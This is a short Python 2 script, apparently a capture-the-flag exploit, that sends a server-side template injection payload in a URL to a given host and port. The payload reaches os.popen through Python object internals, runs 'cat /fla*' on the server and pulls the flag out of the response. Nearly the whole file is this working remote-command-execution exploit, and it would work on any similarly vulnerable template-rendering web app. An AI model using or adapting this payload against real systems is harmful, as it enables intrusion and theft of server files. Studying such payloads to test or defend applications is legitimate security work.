#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import requests

def get_flag(host, port):
    print "[+] Getting flag of %s:%d" % (host, port)
    try:
        url = "http://%s:%d/" % (host, port) + '%7B%7B().__class__.__bases__.0.__subclasses__().59.__init__.__globals__.linecache.os.popen(%22cat%20/fla*%22).read()%7D%7D'
        print url
        response = requests.get(url, verify=False)
        content = response.content
        flag = content.split("http://")[1].split("/")[1].split("\n")[0]
        return flag
    except Exception as e:
        return ""

def main():
    print get_flag(sys.argv[1], int(sys.argv[2]))

if __name__ == "__main__":
    main()

